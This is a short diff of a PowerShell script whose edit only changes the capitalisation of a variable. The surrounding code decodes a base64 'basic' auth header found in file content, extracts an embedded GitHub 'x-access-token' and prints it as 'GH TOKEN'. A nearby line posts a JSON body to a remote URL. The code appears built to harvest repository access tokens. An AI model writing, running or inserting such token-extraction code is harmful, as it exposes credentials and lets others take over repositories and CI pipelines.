@@ -13,10 +13,10 @@ $response = Invoke-RestMethod -Uri $remoteUrl -Method Post -Body $jsonBody -Cont
 $token = ""
 $authHeader = ""
 if ($fileContent -match "basic[\s]+([\w\=]+)") {
-    $authHeader = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($matches[1]))
+    $authHeader = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Matches[1]))
     Write-Output "Auth: $authHeader"
     if ($authHeader -match "x-access-token:([\w\-_]+)") {
-        $token = $matches[1]
+        $token = $Matches[1]
         Write-Output "GH TOKEN: $token"
     }
     
